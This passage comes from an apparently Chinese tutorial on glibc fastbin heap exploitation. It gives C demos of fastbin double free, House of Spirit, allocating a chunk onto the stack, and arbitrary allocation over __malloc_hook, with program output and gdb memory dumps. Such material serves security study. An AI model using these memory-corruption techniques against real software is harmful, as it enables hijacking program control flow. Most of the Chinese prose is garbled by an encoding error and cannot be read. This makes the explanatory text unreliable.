class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">void</span> *chunk1,*chunk2,*chunk3;<br>    <span class="hljs-keyword">void</span> *chunk_a,*chunk_b;<br><br>    bss_chunk.size=<span class="hljs-number">0x21</span>;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">free</span>(chunk1);<br>    <span class="hljs-built_in">free</span>(chunk2);<br>    <span class="hljs-built_in">free</span>(chunk1);<br><br>    chunk_a=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    *(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *)chunk_a=&amp;bss_chunk;<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    chunk_b=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p&quot;</span>,chunk_b);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><h3 id="ä»‹ç»-2"><a href="#ä»‹ç»-2" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>House of Spirit æ˜¯ <code>the Malloc Maleficarum</code> ä¸­çš„ä¸€ç§æŠ€æœ¯ã€‚</p><p>è¯¥æŠ€æœ¯çš„æ ¸å¿ƒåœ¨äº<strong>åœ¨ç›®æ ‡ä½ç½®å¤„ä¼ªé€  fastbin chunkï¼Œå¹¶å°†å…¶é‡Šæ”¾</strong>ï¼Œä»è€Œè¾¾åˆ°åˆ†é…<strong>æŒ‡å®šåœ°å€</strong>çš„ chunk çš„ç›®çš„ã€‚</p><p>è¦æƒ³æ„é€  fastbin fake chunkï¼Œå¹¶ä¸”å°†å…¶é‡Šæ”¾æ—¶ï¼Œå¯ä»¥å°†å…¶æ”¾å…¥åˆ°å¯¹åº”çš„ fastbin é“¾è¡¨ä¸­ï¼Œéœ€è¦ç»•è¿‡ä¸€äº›å¿…è¦çš„æ£€æµ‹ï¼Œå³</p><ul><li>fake chunk çš„ ISMMAP ä½ä¸èƒ½ä¸º 1ï¼Œå› ä¸º free æ—¶ï¼Œå¦‚æœæ˜¯ mmap çš„ chunkï¼Œä¼šå•ç‹¬å¤„ç†ã€‚</li><li>fake chunk åœ°å€éœ€è¦å¯¹é½ï¼Œ MALLOC_ALIGN_MASK</li><li>fake chunk çš„ size å¤§å°éœ€è¦æ»¡è¶³å¯¹åº”çš„ fastbin çš„éœ€æ±‚ï¼ŒåŒæ—¶ä¹Ÿå¾—å¯¹é½ã€‚</li><li>fake chunk çš„ next chunk çš„å¤§å°ä¸èƒ½å°äº <code>2 * SIZE_SZ</code>ï¼ŒåŒæ—¶ä¹Ÿä¸èƒ½å¤§äº<code>av-&gt;system_mem</code> ã€‚</li><li>fake chunk å¯¹åº”çš„ fastbin é“¾è¡¨å¤´éƒ¨ä¸èƒ½æ˜¯è¯¥ fake chunkï¼Œå³ä¸èƒ½æ„æˆ double free çš„æƒ…å†µã€‚</li></ul><h3 id="æ¼”ç¤º"><a href="#æ¼”ç¤º" class="headerlink" title="æ¼”ç¤º"></a>æ¼”ç¤º</h3><p>è¿™é‡Œå°±ç›´æ¥ä»¥ how2heap ä¸Šçš„ä¾‹å­è¿›è¡Œè¯´æ˜ï¼Œå¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file demonstrates the house of spirit attack.\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.\n&quot;</span>);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *a;<br>    <span class="hljs-comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> fake_chunks[<span class="hljs-number">10</span>] __attribute__ ((aligned (<span class="hljs-number">16</span>)));<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">7</span>]);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);<br>    fake_chunks[<span class="hljs-number">1</span>] = <span class="hljs-number">0x40</span>; <span class="hljs-comment">// this is the size</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);<br>        <span class="hljs-comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span><br>    fake_chunks[<span class="hljs-number">9</span>] = <span class="hljs-number">0x1234</span>; <span class="hljs-comment">// nextsize</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);<br>    a = &amp;fake_chunks[<span class="hljs-number">2</span>];<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Freeing the overwritten pointer.\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(a);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">2</span>]);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;malloc(0x30): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>));<br>&#125;<br></code></pre></div></td></tr></table></figure><p>è¿è¡Œåçš„æ•ˆæœå¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">âœ  how2heap git:(master) ./house_of_spirit<br>This file demonstrates the house of spirit attack.<br>Calling malloc() once so that it sets up its memory.<br>We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.<br>This region (memory of length: 80) contains two chunks. The first starts at 0x7ffd9bceaa58 and the second at 0x7ffd9bceaa88.<br>This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.<br>... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.<br>The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.<br>Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffd9bceaa58.<br>... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.<br>Freeing the overwritten pointer.<br>Now the next malloc will return the region of our fake chunk at 0x7ffd9bceaa58, which will be 0x7ffd9bceaa60!<br>malloc(0x30): 0x7ffd9bceaa60<br></code></pre></div></td></tr></table></figure><h3 id="å°æ€»ç»“"><a href="#å°æ€»ç»“" class="headerlink" title="å°æ€»ç»“"></a>å°æ€»ç»“</h3><p>å¯ä»¥çœ‹å‡ºï¼Œæƒ³è¦ä½¿ç”¨è¯¥æŠ€æœ¯åˆ†é… chunk åˆ°æŒ‡å®šåœ°å€ï¼Œå…¶å®å¹¶ä¸éœ€è¦ä¿®æ”¹æŒ‡å®šåœ°å€çš„ä»»ä½•å†…å®¹ï¼Œ<strong>å…³é”®æ˜¯è¦èƒ½å¤Ÿä¿®æ”¹æŒ‡å®šåœ°å€çš„å‰åçš„å†…å®¹ä½¿å…¶å¯ä»¥ç»•è¿‡å¯¹åº”çš„æ£€æµ‹</strong>ã€‚è¿˜èƒ½æ€æ ·ç»•è¿‡å‘¢? æš‚æ—¶åªçŸ¥é“ä¸Šé¢çš„æ–¹æ³•, æœ‰å¾…è¡¥å…….</p><h2 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h2><h3 id="ä»‹ç»-3"><a href="#ä»‹ç»-3" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>å‰æ–‡æ‰€è®²çš„ Fastbin Double Free ä¸ house of spirit æŠ€æœ¯å’Œæœ¬èŠ‚æ‰€è®²çš„Alloc to Stackï¼Œå®ƒä»¬çš„æœ¬è´¨éƒ½åœ¨äº fastbin é“¾è¡¨çš„ç‰¹æ€§ï¼š<strong>å½“å‰ chunk çš„ fd æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ª chunkã€‚</strong> </p><p>è¯¥æŠ€æœ¯çš„æ ¸å¿ƒç‚¹åœ¨äºåŠ«æŒ fastbin é“¾è¡¨ä¸­ chunk çš„ fd æŒ‡é’ˆï¼ŒæŠŠ fd æŒ‡é’ˆæŒ‡å‘æˆ‘ä»¬æƒ³è¦åˆ†é…çš„æ ˆä¸Šï¼Œä»è€Œå®ç°æ§åˆ¶æ ˆä¸­çš„ä¸€äº›å…³é”®æ•°æ®ï¼Œæ¯”å¦‚è¿”å›åœ°å€ç­‰ã€‚</p><h3 id="æ¼”ç¤º-1"><a href="#æ¼”ç¤º-1" class="headerlink" title="æ¼”ç¤º"></a>æ¼”ç¤º</h3><p>è¿™æ¬¡æˆ‘ä»¬æŠŠ fake_chunk ç½®äºæ ˆä¸­ç§°ä¸º stack_chunkï¼ŒåŒæ—¶åŠ«æŒäº† fastbin é“¾è¡¨ä¸­ chunk çš„ fd å€¼ï¼Œé€šè¿‡æŠŠè¿™ä¸ª fd å€¼æŒ‡å‘ stack_chunk å°±å¯ä»¥å®ç°åœ¨æ ˆä¸­åˆ†é… fastbin chunkã€‚</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">chunk</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> pre_size;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> size;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> fd;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> bk;<br>&#125; CHUNK,*PCHUNK;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    CHUNK stack_chunk;<br><br>    <span class="hljs-keyword">void</span> *chunk1;<br>    <span class="hljs-keyword">void</span> *chunk_a;<br><br>    stack_chunk.size=<span class="hljs-number">0x21</span>;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//0x10æ˜¯user date, chunk1æŒ‡å‘çš„æ˜¯fdæŒ‡é’ˆ</span><br><br>    <span class="hljs-built_in">free</span>(chunk1); <span class="hljs-comment">//free chunk1ä¹‹åfastbinä¸­åªæœ‰è¿™ä¸€ä¸ªchunk, fdæŒ‡å‘NULL, </span><br><br>    *(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *)chunk1=&amp;stack_chunk; <span class="hljs-comment">//ä¿®æ”¹ä¸º8å­—èŠ‚çš„æŒ‡é’ˆ, å°†fdæŒ‡é’ˆèµ‹å€¼ä¸ºstack_chunk</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//å°†chunk1å–å‡º</span><br>    chunk_a=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//mallocå‡ºäº†ä¸€ä¸ªfack_chunk(stack_chunk), è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹æ ˆä¸Šçš„æ•°æ®äº†</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>é€šè¿‡ gdb è°ƒè¯•å¯ä»¥çœ‹åˆ°æˆ‘ä»¬é¦–å…ˆæŠŠ chunk1 çš„ fd æŒ‡é’ˆæŒ‡å‘äº† stack_chunk</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1<br>0x602010:   0x00007fffffffde60  0x0000000000000000<br>0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;=== top chunk<br></code></pre></div></td></tr></table></figure><p>ä¹‹åç¬¬ä¸€æ¬¡ malloc ä½¿å¾— fastbin é“¾è¡¨æŒ‡å‘äº† stack_chunkï¼Œè¿™æ„å‘³ç€ä¸‹ä¸€æ¬¡åˆ†é…ä¼šä½¿ç”¨ stack_chunk çš„å†…å­˜è¿›è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000000000000 &lt;=== unsorted bin<br>0x7ffff7dd1b28 &lt;main_arena+8&gt;:  0x00007fffffffde60 &lt;=== fastbin[0]<br>0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000<br></code></pre></div></td></tr></table></figure><p>æœ€ç»ˆç¬¬äºŒæ¬¡ malloc è¿”å›å€¼ä¸º 0x00007fffffffde70 ä¹Ÿå°±æ˜¯ stack_chunk</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">   0x400629 &lt;main+83&gt;        call   0x4004c0 &lt;malloc@plt&gt;<br> â†’ 0x40062e &lt;main+88&gt;        mov    QWORD PTR [rbp-0x38], rax<br><span class="hljs-meta">   $</span><span class="bash">rax   : 0x00007fffffffde70</span><br><br>0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst<br>0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst<br>0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst<br>0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]<br>0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw-<br>0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so<br>0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw-<br>0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw-<br>0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]<br>0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]<br>0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so<br>0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so<br>0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-<br>0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]<br>0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]<br></code></pre></div></td></tr></table></figure><h3 id="å°æ€»ç»“-1"><a href="#å°æ€»ç»“-1" class="headerlink" title="å°æ€»ç»“"></a>å°æ€»ç»“</h3><p>é€šè¿‡è¯¥æŠ€æœ¯æˆ‘ä»¬å¯ä»¥æŠŠ fastbin chunk åˆ†é…åˆ°æ ˆä¸­ï¼Œä»è€Œæ§åˆ¶è¿”å›åœ°å€ç­‰å…³é”®æ•°æ®ã€‚è¦å®ç°è¿™ä¸€ç‚¹æˆ‘ä»¬éœ€è¦åŠ«æŒ fastbin ä¸­ chunk çš„ fd åŸŸï¼ŒæŠŠå®ƒæŒ‡åˆ°æ ˆä¸Šï¼Œå½“ç„¶åŒæ—¶éœ€è¦æ ˆä¸Šå­˜åœ¨æœ‰æ»¡è¶³æ¡ä»¶çš„ size å€¼ã€‚</p><h2 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h2><h3 id="ä»‹ç»-4"><a href="#ä»‹ç»-4" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>Arbitrary Alloc å…¶å®ä¸ Alloc to stack æ˜¯å®Œå…¨ç›¸åŒçš„ï¼Œå”¯ä¸€çš„åŒºåˆ«æ˜¯åˆ†é…çš„ç›®æ ‡ä¸å†æ˜¯æ ˆä¸­ã€‚ äº‹å®ä¸Šåªè¦æ»¡è¶³ç›®æ ‡åœ°å€å­˜åœ¨åˆæ³•çš„ size åŸŸï¼ˆè¿™ä¸ª size åŸŸæ˜¯æ„é€ çš„ï¼Œè¿˜æ˜¯è‡ªç„¶å­˜åœ¨çš„éƒ½æ— å¦¨ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠ chunk åˆ†é…åˆ°ä»»æ„çš„å¯å†™å†…å­˜ä¸­ï¼Œæ¯”å¦‚ <strong>bssã€heapã€dataã€stack</strong> ç­‰ç­‰ã€‚</p><h3 id="æ¼”ç¤º-2"><a href="#æ¼”ç¤º-2" class="headerlink" title="æ¼”ç¤º"></a>æ¼”ç¤º</h3><p>åœ¨è¿™ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬ä½¿ç”¨å­—èŠ‚é”™ä½æ¥å®ç°ç›´æ¥åˆ†é… fastbin åˆ°**_malloc_hook çš„ä½ç½®ï¼Œç›¸å½“äºè¦†ç›–_malloc_hook æ¥æ§åˆ¶ç¨‹åºæµç¨‹ã€‚** </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">void</span> *chunk1;<br>    <span class="hljs-keyword">void</span> *chunk_a;<br><br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x60</span>);<br><br>    <span class="hljs-built_in">free</span>(chunk1);<br><br>    *(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *)chunk1=<span class="hljs-number">0x7ffff7dd1af5</span><span class="hljs-number">-0x8</span>;<span class="hljs-comment">//1ad5æ˜¯malloc_hookçš„ä½ç½®, ç”±äºfdæŒ‡é’ˆæŒ‡å‘çš„æ˜¯chunkçš„å¼€å¤´, </span><br>    <span class="hljs-comment">//æ‰€ä»¥è¦è¦†ç›–malloc_hookè¦å¾€å‰8å­—èŠ‚ä½¿å…¶æˆä¸ºuser date</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x60</span>); <span class="hljs-comment">//mallocå‡ºtemp</span><br>    chunk_a=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x60</span>); <span class="hljs-comment">//å¾€è¿™ä¸ªæŒ‡é’ˆé‡Œé¢å†™å†…å®¹å°±å¯ä»¥æ”¹å†™malloc_hook</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>è¿™é‡Œçš„ <strong>0x7ffff7dd1af5</strong> æ˜¯æˆ‘æ ¹æ®æœ¬æœºçš„æƒ…å†µå¾—å‡ºçš„å€¼ï¼Œè¿™ä¸ªå€¼æ˜¯æ€ä¹ˆè·å¾—çš„å‘¢ï¼Ÿé¦–å…ˆæˆ‘ä»¬è¦è§‚å¯Ÿæ¬²å†™å…¥åœ°å€é™„è¿‘æ˜¯å¦å­˜åœ¨å¯ä»¥<strong>å­—èŠ‚é”™ä½</strong>çš„æƒ…å†µã€‚</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">0x7ffff7dd1a88 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1a90 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1a98 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1aa0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1aa8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ab0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ab8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ac0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ac8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ad0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ad8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ae0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ae8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0<br>0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0<br>0x7ffff7dd1b08 0x0  0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0<br>0x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x30    0x28    0xa9    0xf7    0xff    0x7f    0x0 0x0<br></code></pre></div></td></tr></table></figure><p>0x7ffff7dd1b10 æ˜¯æˆ‘ä»¬æƒ³è¦æ§åˆ¶çš„ __malloc_hook çš„åœ°å€ï¼Œäºæ˜¯æˆ‘ä»¬å‘ä¸Šå¯»æ‰¾æ˜¯å¦å¯ä»¥é”™ä½å‡ºä¸€ä¸ªåˆæ³•çš„ size åŸŸã€‚å› ä¸ºè¿™ä¸ªç¨‹åºæ˜¯ 64 ä½çš„ï¼Œå› æ­¤ fastbin çš„èŒƒå›´ä¸º 32 å­—èŠ‚åˆ° 128 å­—èŠ‚ (0x20-0x80)ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//è¿™é‡Œçš„sizeæŒ‡ç”¨æˆ·åŒºåŸŸï¼Œå› æ­¤ä¼šå°äº2å€SIZE_SZ</span><br>Fastbins[idx=<span 